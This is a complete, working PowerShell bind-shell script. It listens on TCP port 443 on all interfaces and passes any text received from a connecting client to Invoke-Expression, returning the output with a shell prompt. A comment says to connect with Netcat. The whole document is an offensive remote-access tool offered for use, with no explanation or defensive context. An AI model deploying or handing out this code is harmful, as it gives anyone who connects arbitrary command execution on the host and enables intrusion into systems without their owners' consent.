###PowerShell Bind Shell
###Use Netcat or similar to connect to this system, you will need its IP address
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);
$listener.Start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|ForEach-Object{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (Invoke-Expression $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '>';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
$listener.Stop();